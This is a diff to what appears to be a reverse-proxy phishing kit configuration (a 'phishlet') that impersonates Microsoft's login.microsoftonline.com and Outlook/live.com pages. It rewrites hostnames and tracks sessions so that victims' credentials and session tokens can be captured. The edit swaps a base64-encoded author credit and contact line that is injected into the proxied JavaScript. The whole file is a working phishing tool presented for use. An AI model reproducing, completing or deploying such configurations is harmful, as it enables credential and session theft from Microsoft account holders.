@@ -10,7 +10,7 @@ proxy_hosts:
   - { phish_sub: "live-outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
 
 sub_filters:
-  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'if(src){return "VGhpcyBwaGlzaGxldCB3YXMgY3JlYXRlZCBieSBANDU2NDc4IC8gQHRvbWthYmVs"}', replace: 'if(src){return "WW91IGNhbiBjb250YWN0IG1lIG9uIFRlbGVncmFtOiBAdG9ta2FiZWwgYW5kIEphYmJlcjogbWVydHZ5ZWR1c2hpQGV4cGxvaXQuaW0=="}', mimes: ["application/x-javascript"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'if(src){return "VGhpcyBwaGlzaGxldCB3YXMgY3JlYXRlZCBieSBANDU2NDc4IC8gQHRvbWthYmVs"}', replace: 'if(src){return "WW91IGNhbiBjb250YWN0IG1lIG9uIFRlbGVncmFtOiBAdG9ta2FiZWwgYW5kIEphYmJlcjogNDU2NDc4QHhtcHAuc2c="}', mimes: ["application/x-javascript"]}
   - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
   - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
   - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
